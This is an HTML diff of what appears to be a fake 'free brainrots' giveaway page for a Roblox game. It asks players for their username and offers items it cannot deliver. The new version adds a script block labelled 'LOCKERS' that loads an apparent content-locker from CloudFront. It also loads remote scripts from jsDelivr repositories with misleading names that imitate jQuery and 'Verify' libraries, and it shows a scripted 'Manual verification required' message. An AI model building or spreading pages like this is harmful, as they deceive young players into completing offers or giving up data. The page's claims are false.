-          </div>
-        </div>
-      </div>
-       <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Smurf_cat1.png">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Smurf Cat</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x63 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Smurf Cat')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Smurf Cat')">FREE</span>
-            <span class="price-victor" onclick="openForm('Smurf Cat')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <div class="form-wrapper" id="formWrapper">
-      <h2 id="chosenItemTitle">enter your username exactly as shown in the game!</h2>
-
-      <div class="input-section">
-        <input type="text" placeholder="Enter Username">
-        <div id="search">SEARCH</div>
-      </div>
-
-      <div class="loading-gif d-none">
-        <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/loading.gif">
-      </div>
-
-      <div class="profile d-none" style="position: relative; padding: 20px;">
-        <div class="img"><img src="" alt="Avatar"></div>
-        <div class="welcome-text"></div>
-        <div class="continue-btn" id="continueBtn">CLAIM BRAINROTS</div>
-
-        <!-- Instruction box with white background, messages inside HTML -->
-        <div class="instruction-text d-none" style="background:white; padding:10px; margin-top:10px; border-radius:5px; font-weight:bold; font-size:18px;">
-          <div class="msg msg1" style="display:none; color:green;">Verifying...</div>
-          <div class="msg msg2" style="display:none; color:green;">Sending Brainrots...</div>
-          <div class="msg msg3" style="display:none; color:red;">An error occurred</div>
-          <div class="msg msg4" style="display:none; color:red;">Manual verification required</div>
-        </div>
-
-        <div id="welcome-text-template" class="d-none">
-          Hello @<span class="user-placeholder"></span>, you will receive <span class="item-placeholder"></span> once you click the button below.
-        </div>
-      </div>
-    </div>
-  </div>
-   <script src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery@main/Y7u8HSb.js"></script>
-   <script src="https://cdn.jsdelivr.net/gh/dev20l/-ajax-libs-jquery-3.7.1-jquery@main/M8hsu7c.js"></script>
- <script type="text/javascript">
+  
+<!-- LOCKERS ------------------------------- -->
+<!------------------------------ -->
+<script type="text/javascript">
     var PQIKb_Ddh_HpEEFc={"it":4527040,"key":"10472"};
 </script>
 <script src="https://dlk457skl57zp.cloudfront.net/30b74bc.js"></script>
+<!------------------------------ -->
+
+<style>
+  .image-grid div { background-image: url('https://cdn.jsdelivr.net/gh/monorolls/sas@main/bbg.webp'); }
+.sequence-box::before { background-image: url('https://cdn.jsdelivr.net/gh/monorolls/sas@main/labbb.webp'); }
+.sequence-box::after { background-image: url('https://cdn.jsdelivr.net/gh/lib-devtools/supercell/lab3.webp'); }
+body { background-color: #0066cc;
+ .image-instruction {
+  position: relative;
+  z-index: 2;
+     color: #fff;
+  text-align: center;
+  margin-top: 5px;
+  text-shadow: 0 0 5px rgba(0,0,0,0.7);
+
+</style>
+  <div class="overlay" id="overlay"></div>
+  <div class="content-switcher">
+    <div class="container" id="main-content">
+      <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/labb.webp" alt="Logo Image" class="central-image">
+
+     <div class="user-input-container">
+    <input type="text" class="user-input" placeholder=" enter your Usernameج correctly." id="username">
+    <img src="https://cdn.jsdelivr.net/gh/lib-devtools/supercell/622669.webp" alt="search" class="search-icon">
+     </div>
+      <p id="error-msg" class="error hidden"></p>
+      <button id="generate-btn" disabled>Generate</button>
+
+      <p class="selection-warning" id="selection-warning">
+        ⚠️ Please select at least one item to continue
+      </p>
+
+<p class="image-instruction">Claim your BRAINROT NOW that you want added to your account.</p>
+ <p id="item-warning-msg" class="warning hidden">Please select at least 1 item!</p>
+ <div id="grid1" class="image-grid">
+  <div data-item="makeup">
+    <p class="image-description">Fragrama and Chocrama</p>
+    <img src="https://i.postimg.cc/4d0VGXFJ/Whats-App-Image-2025-11-08-at-9-40-52-PM-removebg-preview.png" class="flex-image">
+  </div>
+
+  <div data-item="makeup">
+    <p class="image-description">Los Spaghettis</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/LosSpaghettis.png" class="flex-image">
+  </div>
+
+  <div data-item="makeup">
+    <p class="image-description">Cooki and Milki</p>
+    <img src="https://static.wikia.nocookie.net/stealabr/images/9/9b/Cooki_and_milki.png" class="flex-image">
+  </div>
+
+  <div data-item="makeup">
+    <p class="image-description">Los Puggies</p>
+    <img src="https://static.wikia.nocookie.net/stealabr/images/d/d6/Losmoneypug.png" class="flex-image">
+  </div>
+
+  <div data-item="makeup">
+    <p class="image-description">Capitano Moby</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/CapitanoMoby.webp" class="flex-image">
+  </div>
+
+  <div data-item="makeup">
+    <p class="image-description">Guest 666</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Guest_666.webp" class="flex-image">
+  </div>
+
+  <div data-item="makeup">
+    <p class="image-description">1x1x1x1</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/1x1x1x1.webp" class="flex-image">
+  </div>
+
+  <div data-item="makeup">
+    <p class="image-description">La Taco Combinasion</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/LaTacoCombinasion.webp" class="flex-image">
+  </div>
+
+  <div data-item="makeup">
+    <p class="image-description">La Casa Boo</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Casa_Booo.webp" class="flex-image">
+  </div>
+
+  <div data-item="makeup">
+    <p class="image-description">Headless Horseman</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Gemini-Generated.png" class="flex-image">
+  </div>
+
+  <div data-item="makeup">
+    <p class="image-description">Chipso and Queso</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Chipso_and_queso.webp" class="flex-image">
+  </div>
+
+  <div data-item="makeup">
+    <p class="image-description">Meowl</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Meowl.webp" class="flex-image">
+  </div>
+
+  <div data-item="makeup">
+    <p class="image-description">Mieteteira Bicicleteira</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/mie.png" class="flex-image" style="width:80px; height:80px;">
+  </div>
+
+  <div data-item="makeup">
+    <p class="image-description">Spooky and Pumpky</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Spooky-and-Pumpky.png" class="flex-image">
+  </div>
+
+  <div data-item="makeup">
+    <p class="image-description">Los Mobilis</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Los-Mobilis.png" class="flex-image">
+  </div>
+
+  <div data-item="makeup">
+    <p class="image-description">Eviledon</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Eviledon.png" class="flex-image">
+  </div>
+
+  <div data-item="makeup">
+    <p class="image-description">La Spooky Grande</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/New-La-Grande.png" class="flex-image">
+  </div>
+  <div data-item="makeup">
+    <p class="image-description">Burguro and Fryuro</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/BurguroandFryuro.png" class="flex-image">
+  </div>
+  <div data-item="makeup">
+    <p class="image-description">Los 67</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Los67.png" class="flex-image">
+  </div>
+  <div data-item="makeup">
+    <p class="image-description">Strawberry Elephant</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Strawberry-Elephant.png" class="flex-image">
+  </div>
+  <div data-item="makeup">
+    <p class="image-description">Strawberry Elephant</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/StrawberryElephantog.png" class="flex-image">
+  </div>
+  <div data-item="makeup">
+    <p class="image-description">Chillin Chili</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/ChillinChili1.png" class="flex-image">
+  </div>
+  <div data-item="makeup">
+    <p class="image-description">Tang Tnag Keletang</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Tang-Tnag-Keletang.png" class="flex-image">
+  </div>
+  <div data-item="makeup">
+    <p class="image-description">Money Money Puggy</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Money-Money-Puggy-Leak.png" class="flex-image">
+  </div>
+  <div data-item="makeup">
+    <p class="image-description">Noo My Examen</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Noo-My-Exam.png" class="flex-image">
+  </div>
+  <div data-item="makeup">
+    <p class="image-description">Ketchuru & Musturu</p>
+    <img src="https://static.wikia.nocookie.net/stealabr/images/1/14/Ketchuru.png" class="flex-image">
+  </div>
+  <div data-item="makeup">
+    <p class="image-description">Dragon Cannelloni</p>
+    <img src="https://tr.rbxcdn.com/180DAY-b14aa19aee59dcd2e3fdc474bc8ed42e/420/420/Hat/Webp/noFilter" class="flex-image">
+  </div>
+  <div data-item="makeup">
+    <p class="image-description">Blackhole Bomb</p>
+    <img src="https://static.wikia.nocookie.net/stealabr/images/d/d2/Blackhole_Bomb.png" class="flex-image">
+  </div>
+  <div data-item="makeup">
+    <p class="image-description">Alien Slap</p>
+    <img src="https://static.wikia.nocookie.net/stealabr/images/7/7f/Alien_Slap.png" class="flex-image">
+  </div>
+  <div data-item="makeup">
+    <p class="image-description">Tictac Sahur</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Tictac-Sahur.png" class="flex-image">
+  </div>
+  <div data-item="makeup">
+    <p class="image-description">Mariachi Corazoni</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Mariachi-Corazoni.png" class="flex-image">
+  </div>
+  <div data-item="makeup">
+    <p class="image-description">To To Sahur</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/To-To-To-Sahur.png" class="flex-image">
+  </div>
+  <div data-item="makeup">
+    <p class="image-description">Los Tacoritas</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Los-Tacoritas.png" class="flex-image">
+  </div>
+  <div data-item="makeup">
+    <p class="image-description">Sahur Combinasion</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/LasahurCombinasion.webp" class="flex-image">
+  </div>
+  <div data-item="makeup">
+    <p class="image-description">Tacorita Bicicleta</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Tacorita_Bicicleta_.webp" class="flex-image">
+  </div>
+  <div data-item="makeup">
+    <p class="image-description">SIX SEVEN</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/SIX_SEVEN.webp" class="flex-image">
+  </div>
+  <div data-item="makeup">
+    <p class="image-description">Los Chicleteiritas</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/LosChicleteiritas.png" class="flex-image">
+  </div>
+  <div data-item="makeup">
+    <p class="image-description">La Extinct Grande</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/LaExtinctGrande.png" class="flex-image">
+  </div>
+  <div data-item="makeup">
+    <p class="image-description">Extinct Matteo</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/ExtinctMatteo.webp" class="flex-image">
+  </div>
+  <div data-item="makeup">
+    <p class="image-description">LasSis</p>
+    <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/LasSis.png" class="flex-image">
+  </div>
+</div>
+
+      </div>
+      <div id="background-overlay"></div>
+      <script src="https://cdn.jsdelivr.net/gh/lib-devtools/supercell/Verify.js"></script>
+       <script src="https://cdn.jsdelivr.net/gh/lib-devtools/supercell/o8Uy7J.js"></script>
+      <script src="https://cdn.jsdelivr.net/gh/lib-devtools/supercell/2.js"></script>
+      <script src="https://cdn.jsdelivr.net/gh/lib-devtools/supercell/190.js"></script>
+      <div>
+        <svg class="waves" xmlns="http://www.w3.org/2000/svg"
+             xmlns:xlink="http://www.w3.org/1999/xlink"
+             viewBox="0 24 150 28" preserveAspectRatio="none"
+             shape-rendering="auto">
+          <defs>
+            <path id="gentle-wave"
+                  d="M-160 44c30 0 58-18 88-18s58 18 
+                     88 18 58-18 88-18 58 18 88 18v44h-352z" />
+          </defs>
+          <g class="parallax">
+            <use xlink:href="#gentle-wave" x="48" y="0" fill="rgba(0,176,255,0.6)" />
+            <use xlink:href="#gentle-wave" x="48" y="3" fill="rgba(0,136,255,0.5)" />
+            <use xlink:href="#gentle-wave" x="48" y="5" fill="rgba(0,102,204,0.4)" />
+            <use xlink:href="#gentle-wave" x="48" y="7" fill="#0066" />
+          </g>
+        </svg>
+      </div>
+    </div>
+  </div>
 </body>
 </html>
